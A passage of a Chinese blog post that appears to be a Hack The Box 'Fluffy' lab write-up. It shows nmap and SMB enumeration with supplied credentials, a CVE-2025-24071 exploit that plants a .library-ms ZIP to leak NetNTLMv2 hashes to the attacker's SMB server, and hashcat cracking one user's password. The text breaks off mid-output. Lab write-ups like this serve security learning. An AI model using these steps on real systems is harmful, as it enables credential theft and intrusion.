<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>htb-season8.2-fluffy | myift</title><meta name="author" content="dgh"><meta name="copyright" content="dgh"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="信息收集┌──(root㉿kali)-[&#x2F;srv&#x2F;ftp&#x2F;incoming]└─# nmap -sCV -p- --min-rate 10000 10.10.11.69Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2025-07-26 08:56 EDTNmap scan report for 10.10.11.69Host is up (0.65s">
<meta property="og:type" content="article">
<meta property="og:title" content="htb-season8.2-fluffy">
<meta property="og:url" content="http://example.com/2025/07/28/htb-season8-2-fluffy/index.html">
<meta property="og:site_name" content="myift">
<meta property="og:description" content="信息收集┌──(root㉿kali)-[&#x2F;srv&#x2F;ftp&#x2F;incoming]└─# nmap -sCV -p- --min-rate 10000 10.10.11.69Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2025-07-26 08:56 EDTNmap scan report for 10.10.11.69Host is up (0.65s">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/image/png.png">
<meta property="article:published_time" content="2025-07-28T08:32:46.000Z">
<meta property="article:modified_time" content="2025-07-28T08:33:31.421Z">
<meta property="article:author" content="dgh">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/image/png.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "htb-season8.2-fluffy",
  "url": "http://example.com/2025/07/28/htb-season8-2-fluffy/",
  "image": "http://example.com/image/png.png",
  "datePublished": "2025-07-28T08:32:46.000Z",
  "dateModified": "2025-07-28T08:33:31.421Z",
  "author": [
    {
      "@type": "Person",
      "name": "dgh",
      "url": "http://example.com/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2025/07/28/htb-season8-2-fluffy/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'htb-season8.2-fluffy',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/image/png.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/image/png1.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">myift</span></a><a class="nav-page-title" href="/"><span class="site-name">htb-season8.2-fluffy</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">htb-season8.2-fluffy</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-07-28T08:32:46.000Z" title="发表于 2025-07-28 16:32:46">2025-07-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-07-28T08:33:31.421Z" title="更新于 2025-07-28 16:33:31">2025-07-28</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p><img src="/../imgs/$%7Bfiilename%7D/image-20250726213415466.png" alt="image-20250726213415466"></p>
<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/srv/ftp/incoming]</span><br><span class="line">└─# nmap -sCV -p- --min-rate 10000 10.10.11.69</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-26 08:56 EDT</span><br><span class="line">Nmap scan report for 10.10.11.69</span><br><span class="line">Host is up (0.65s latency).</span><br><span class="line">Not shown: 65516 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-26 19:33:46Z)</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-date: 2025-07-26T19:35:26+00:00; +6h36m16s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=DC01.fluffy.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.fluffy.htb</span><br><span class="line">| Not valid before: 2025-04-17T16:04:17</span><br><span class="line">|_Not valid after:  2026-04-17T16:04:17</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=DC01.fluffy.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.fluffy.htb</span><br><span class="line">| Not valid before: 2025-04-17T16:04:17</span><br><span class="line">|_Not valid after:  2026-04-17T16:04:17</span><br><span class="line">|_ssl-date: 2025-07-26T19:35:25+00:00; +6h36m16s from scanner time.</span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-date: 2025-07-26T19:35:26+00:00; +6h36m16s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=DC01.fluffy.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.fluffy.htb</span><br><span class="line">| Not valid before: 2025-04-17T16:04:17</span><br><span class="line">|_Not valid after:  2026-04-17T16:04:17</span><br><span class="line">3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=DC01.fluffy.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.fluffy.htb</span><br><span class="line">| Not valid before: 2025-04-17T16:04:17</span><br><span class="line">|_Not valid after:  2026-04-17T16:04:17</span><br><span class="line">|_ssl-date: 2025-07-26T19:35:25+00:00; +6h36m16s from scanner time.</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">49667/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49690/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49691/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49707/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49713/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49742/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2025-07-26T19:34:49</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">|_clock-skew: mean: 6h36m15s, deviation: 0s, median: 6h36m15s</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 155.50 seconds</span><br><span class="line">                                                                                        </span><br></pre></td></tr></table></figure>

<p>探测一下smb共享</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/srv/ftp/incoming]</span><br><span class="line">└─# crackmapexec smb 10.10.11.69 -u &#x27;j.fleischman&#x27; -p &#x27;J0elTHEM4n1990!&#x27; --shares</span><br><span class="line">SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.69     445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! </span><br><span class="line">SMB         10.10.11.69     445    DC01             [+] Enumerated shares</span><br><span class="line">SMB         10.10.11.69     445    DC01             Share           Permissions     Remark</span><br><span class="line">SMB         10.10.11.69     445    DC01             -----           -----------     ------</span><br><span class="line">SMB         10.10.11.69     445    DC01             ADMIN$                          Remote Admin</span><br><span class="line">SMB         10.10.11.69     445    DC01             C$                              Default share</span><br><span class="line">SMB         10.10.11.69     445    DC01             IPC$            READ            Remote IPC</span><br><span class="line">SMB         10.10.11.69     445    DC01             IT              READ,WRITE      </span><br><span class="line">SMB         10.10.11.69     445    DC01             NETLOGON        READ            Logon server share </span><br><span class="line">SMB         10.10.11.69     445    DC01             SYSVOL          READ            Logon server share </span><br><span class="line">                                                                                             </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/bachang/htb/8/2fluffy]</span><br><span class="line">└─# smbclient //10.10.11.69/IT -U &quot;j.fleischman&quot;</span><br><span class="line"></span><br><span class="line">Password for [WORKGROUP\j.fleischman]:</span><br><span class="line">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="line">smb: \&gt; ls</span><br><span class="line">  .                                   D        0  Mon May 19 10:27:02 2025</span><br><span class="line">  ..                                  D        0  Mon May 19 10:27:02 2025</span><br><span class="line">  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 11:08:44 2025</span><br><span class="line">  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 11:04:05 2025</span><br><span class="line">  KeePass-2.58                        D        0  Fri Apr 18 11:08:38 2025</span><br><span class="line">  KeePass-2.58.zip                    A  3225346  Fri Apr 18 11:03:17 2025</span><br><span class="line">  Upgrade_Notice.pdf                  A   169963  Sat May 17 10:31:07 2025</span><br><span class="line">cd </span><br><span class="line">                5842943 blocks of size 4096. 2047262 blocks available</span><br><span class="line">smb: \&gt; get Upgrade_Notice.pdf</span><br><span class="line">getting file \Upgrade_Notice.pdf of size 169963 as Upgrade_Notice.pdf (39.4 KiloBytes/sec) (average 39.4 KiloBytes/sec)</span><br><span class="line">smb: \&gt; exit</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/$%7Bfiilename%7D/image-20250727141208913.png" alt="image-20250727141208913"></p>
<p>他们在修补漏洞我们看一下都有什么可利用</p>
<h4 id="cve-2025-24071是通过-RAR-ZIP-提取和-library-ms-文件泄露-NTLM-哈希值"><a href="#cve-2025-24071是通过-RAR-ZIP-提取和-library-ms-文件泄露-NTLM-哈希值" class="headerlink" title="cve-2025-24071是通过 RAR&#x2F;ZIP 提取和 .library-ms 文件泄露 NTLM 哈希值"></a>cve-2025-24071是通过 RAR&#x2F;ZIP 提取和 .library-ms 文件泄露 NTLM 哈希值</h4><p>我们可以利用上传zip获得NTLM 哈希值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/2fluffy/CVE-2025-24071-main]</span><br><span class="line">└─# python3 exploit.py -i 10.10.14.41 -f exploit</span><br><span class="line"></span><br><span class="line">          ______ ____    ____  _______       ___     ___    ___    _____        ___    _  _      ___    ______   __                                        </span><br><span class="line">         /      |\   \  /   / |   ____|     |__ \   / _ \  |__ \  | ____|      |__ \  | || |    / _ \  |____  | /_ |                                       </span><br><span class="line">        |  ,----&#x27; \   \/   /  |  |__    ______ ) | | | | |    ) | | |__    ______ ) | | || |_  | | | |     / /   | |                                       </span><br><span class="line">        |  |       \      /   |   __|  |______/ /  | | | |   / /  |___ \  |______/ /  |__   _| | | | |    / /    | |                                       </span><br><span class="line">        |  `----.   \    /    |  |____       / /_  | |_| |  / /_   ___) |       / /_     | |   | |_| |   / /     | |                                       </span><br><span class="line">         \______|    \__/     |_______|     |____|  \___/  |____| |____/       |____|    |_|    \___/   /_/      |_|                                       </span><br><span class="line">                                                                                                                                                           </span><br><span class="line">                                                                                                                                                           </span><br><span class="line">                                                Windows File Explorer Spoofing Vulnerability (CVE-2025-24071)                                              </span><br><span class="line">                    by ThemeHackers                                                                                                                                                                                                                                                                                   </span><br><span class="line">                                                                                                                                                           </span><br><span class="line">Creating exploit with filename: exploit.library-ms</span><br><span class="line">Target IP: 10.10.14.41</span><br><span class="line"></span><br><span class="line">Generating library file...</span><br><span class="line">✓ Library file created successfully</span><br><span class="line"></span><br><span class="line">Creating ZIP archive...</span><br><span class="line">✓ ZIP file created successfully</span><br><span class="line"></span><br><span class="line">Cleaning up temporary files...</span><br><span class="line">✓ Cleanup completed</span><br><span class="line"></span><br><span class="line">Process completed successfully!</span><br><span class="line">Output file: exploit.zip</span><br><span class="line">Run this file on the victim machine and you will see the effects of the vulnerability such as using ftp smb to send files etc.</span><br><span class="line">                                                                                                                                                           </span><br><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/2fluffy/CVE-2025-24071-main]</span><br><span class="line">└─# ls</span><br><span class="line">exploit.py  exploit.zip  LICENSE  README.md  requirements.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上传zip</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/2fluffy/CVE-2025-24071-main]</span><br><span class="line">└─# smbclient //10.10.11.69/IT -U j.fleischman%J0elTHEM4n1990! -c &quot;put exploit.zip&quot;</span><br><span class="line">putting file exploit.zip as \exploit.zip (0.5 kb/s) (average 0.5 kb/s)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>看一下监听结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/2fluffy/CVE-2025-24071-main]</span><br><span class="line">└─# impacket-smbserver share ./share -smb2support</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0</span><br><span class="line">[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Incoming connection (10.10.11.69,56480)</span><br><span class="line">[*] AUTHENTICATE_MESSAGE (FLUFFY\p.agila,DC01)</span><br><span class="line">[*] User DC01\p.agila authenticated successfully</span><br><span class="line">[*] p.agila::FLUFFY:aaaaaaaaaaaaaaaa:a7120225a7fb4ee9ee78350d0efe3ae0:01010000000000008035c548d3fedb01ce761f9e03b5545100000000010010006500410055006f004e00480043007100030010006500410055006f004e004800430071000200100050004f0043005600720068004f004a000400100050004f0043005600720068004f004a00070008008035c548d3fedb010600040002000000080030003000000000000000010000000020000054e6a940f446806547868bec8520a22e30044cd616e1285d3ed58bb14b4ac0e30a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00340031000000000000000000</span><br><span class="line">[*] Closing down connection (10.10.11.69,56480)</span><br><span class="line">[*] Remaining connections []</span><br><span class="line">[*] Incoming connection (10.10.11.69,56481)</span><br><span class="line">[*] AUTHENTICATE_MESSAGE (FLUFFY\p.agila,DC01)</span><br><span class="line">[*] User DC01\p.agila authenticated successfully</span><br><span class="line">[*] p.agila::FLUFFY:aaaaaaaaaaaaaaaa:80a8687700e04829ba984d1db8650078:010100000000000000cc5d49d3fedb0168aa22537e749fa300000000010010006500410055006f004e00480043007100030010006500410055006f004e004800430071000200100050004f0043005600720068004f004a000400100050004f0043005600720068004f004a000700080000cc5d49d3fedb010600040002000000080030003000000000000000010000000020000054e6a940f446806547868bec8520a22e30044cd616e1285d3ed58bb14b4ac0e30a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00340031000000000000000000</span><br><span class="line">[*] Closing down connection (10.10.11.69,56481)</span><br><span class="line">[*] Remaining connections []</span><br><span class="line">[*] Incoming connection (10.10.11.69,56482)</span><br><span class="line">[*] AUTHENTICATE_MESSAGE (FLUFFY\p.agila,DC01)</span><br><span class="line">[*] User DC01\p.agila authenticated successfully</span><br><span class="line">[*] p.agila::FLUFFY:aaaaaaaaaaaaaaaa:fc9eb9eb14397ee2dcf26130cd255fa0:01010000000000008062f649d3fedb0185c03b96bcce126b00000000010010006500410055006f004e00480043007100030010006500410055006f004e004800430071000200100050004f0043005600720068004f004a000400100050004f0043005600720068004f004a00070008008062f649d3fedb010600040002000000080030003000000000000000010000000020000054e6a940f446806547868bec8520a22e30044cd616e1285d3ed58bb14b4ac0e30a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00340031000000000000000000</span><br><span class="line">[*] Closing down connection (10.10.11.69,56482)</span><br><span class="line">[*] Remaining connections []</span><br><span class="line">[*] Incoming connection (10.10.11.69,56483)</span><br><span class="line">[*] AUTHENTICATE_MESSAGE (FLUFFY\p.agila,DC01)</span><br><span class="line">[*] User DC01\p.agila authenticated successfully</span><br><span class="line">[*] p.agila::FLUFFY:aaaaaaaaaaaaaaaa:1521ba3de8c9bcf81945b1ddd6deea59:010100000000000000f98e4ad3fedb01f76458b180d1935000000000010010006500410055006f004e00480043007100030010006500410055006f004e004800430071000200100050004f0043005600720068004f004a000400100050004f0043005600720068004f004a000700080000f98e4ad3fedb010600040002000000080030003000000000000000010000000020000054e6a940f446806547868bec8520a22e30044cd616e1285d3ed58bb14b4ac0e30a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00340031000000000000000000</span><br><span class="line">[*] Closing down connection (10.10.11.69,56483)</span><br><span class="line">[*] Remaining connections []</span><br><span class="line">[*] Incoming connection (10.10.11.69,56484)</span><br><span class="line">[*] AUTHENTICATE_MESSAGE (FLUFFY\p.agila,DC01)</span><br><span class="line">[*] User DC01\p.agila authenticated successfully</span><br><span class="line">[*] p.agila::FLUFFY:aaaaaaaaaaaaaaaa:4ec9d35651b43f15a855247dea1bfc42:0101000000000000808f274bd3fedb01e00f7352c66005fe00000000010010006500410055006f004e00480043007100030010006500410055006f004e004800430071000200100050004f0043005600720068004f004a000400100050004f0043005600720068004f004a0007000800808f274bd3fedb010600040002000000080030003000000000000000010000000020000054e6a940f446806547868bec8520a22e30044cd616e1285d3ed58bb14b4ac0e30a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00340031000000000000000000</span><br><span class="line">[*] Closing down connection (10.10.11.69,56484)</span><br><span class="line">[*] Remaining connections []</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>将得到的hash爆破一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/2fluffy/CVE-2025-24071-main]</span><br><span class="line">└─# hashcat --identify hash</span><br><span class="line">The following hash-mode match the structure of your input hash:</span><br><span class="line"></span><br><span class="line">      # | Name                                                       | Category</span><br><span class="line">  ======+============================================================+======================================</span><br><span class="line">   5600 | NetNTLMv2                                                  | Network Protocol</span><br><span class="line"></span><br><span class="line">                                                                                                                                                           </span><br><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/2fluffy/CVE-2025-24071-main]</span><br><span class="line">└─# cat hash              </span><br><span class="line">p.agila::FLUFFY:aaaaaaaaaaaaaaaa:4ec9d35651b43f15a855247dea1bfc42:0101000000000000808f274bd3fedb01e00f7352c66005fe00000000010010006500410055006f004e00480043007100030010006500410055006f004e004800430071000200100050004f0043005600720068004f004a000400100050004f0043005600720068004f004a0007000800808f274bd3fedb010600040002000000080030003000000000000000010000000020000054e6a940f446806547868bec8520a22e30044cd616e1285d3ed58bb14b4ac0e30a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00340031000000000000000000</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/2fluffy/CVE-2025-24071-main]</span><br><span class="line">└─# hashcat -m 5600 -a 0 hash /usr/share/wordlists/rockyou.txt</span><br><span class="line">hashcat (v6.2.6) starting</span><br><span class="line"></span><br><span class="line">OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]</span><br><span class="line">============================================================================================================================================</span><br><span class="line">* Device #1: cpu-sandybridge-11th Gen Intel(R) Core(TM) i5-1135G7 @ 2.40GHz, 2212/4489 MB (1024 MB allocatable), 4MCU</span><br><span class="line"></span><br><span class="line">Minimum password length supported by kernel: 0</span><br><span class="line">Maximum password length supported by kernel: 256</span><br><span class="line"></span><br><span class="line">Hashes: 1 digests; 1 unique digests, 1 unique salts</span><br><span class="line">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates</span><br><span class="line">Rules: 1</span><br><span class="line"></span><br><span class="line">Optimizers applied:</span><br><span class="line">* Zero-Byte</span><br><span class="line">* Not-Iterated</span><br><span class="line">* Single-Hash</span><br><span class="line">* Single-Salt</span><br><span class="line"></span><br><span class="line">ATTENTION! Pure (unoptimized) backend kernels selected.</span><br><span class="line">Pure kernels can crack longer passwords, but drastically reduce performance.</span><br><span class="line">If you want to switch to optimized kernels, append -O to your commandline.</span><br><span class="line">See the above message to find out about the exact limits.</span><br><span class="line"></span><br><span class="line">Watchdog: Temperature abort trigger set to 90c</span><br><span class="line"></span><br><span class="line">Host memory required for this attack: 1 MB</span><br><span class="line"></span><br><span class="line">Dictionary cache hit:</span><br><span class="line">* Filename..: /usr/share/wordlists/rockyou.txt</span><br><span class="line">* Passwords.: 14344385</span><br><span class="line">* Bytes.....: 139921507</span><br><span class="line">* Keyspace..: 14344385</span><br><span class="line"></span><br><span class="line">Cracking performance lower than expected?                 </span><br><span class="line"></span><br><span class="line">* Append -O to the commandline.</span><br><span class="line">  This lowers the maximum supported password/salt length (usually down to 32).</span><br><span class="line"></span><br><span class="line">* Append -w 3 to the commandline.</span><br><span class="line">  This can cause your screen to lag.</span><br><span class="line"></span><br><span class="line">* Append -S to the commandline.</span><br><span class="line">  This has a drastic speed impact but can be better for specific attacks.</span><br><span class="line">  Typical scenarios are a small wordlist but a large ruleset.</span><br><span class="line"></span><br><span class="line">* Update your backend API runtime / driver the right way:</span><br><span class="line">  https://hashcat.net/faq/wrongdriver</span><br><span class="line"></span><br><span class="line">* Create more work items to make use of your parallelization power:</span><br><span class="line">  https://hashcat.net/faq/morework</span><br><span class="line"></span><br><span class="line">P.AGILA::FLUFFY:aaaaaaaaaaaaaaaa:4ec9d35651b43f15a855247dea1bfc42:0101000000000000808f274bd3fedb01e00f7352c66005fe00000000010010006500410055006f004e00480043007100030010006500410055006f004e004800430071000200100050004f0043005600720068004f004a000400100050004f0043005600720068004f004a0007000800808f274bd3fedb010600040002000000080030003000000000000000010000000020000054e6a940f446806547868bec8520a22e30044cd616e1285d3ed58bb14b4ac0e30a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00340031000000000000000000:prometheusx-303</span><br><span class="line">                                                          </span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Mode........: 5600 (NetNTLMv2)</span><br><span class="line">Hash.Target......: P.AGILA::FLUFFY:aaaaaaaaaaaaaaaa:4ec9d35651b43f15a8...000000</span><br><span class="line">Time.Started.....: Sun Jul 27 06:34:58 2025 (7 secs)</span><br><span class="line">Time.Estimated...: Sun Jul 27 06:35:05 2025 (0 secs)</span><br><span class="line">Kernel.Feature...: Pure Kernel</span><br><span class="line">Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)</span><br><span class="line">Guess.Queue......: 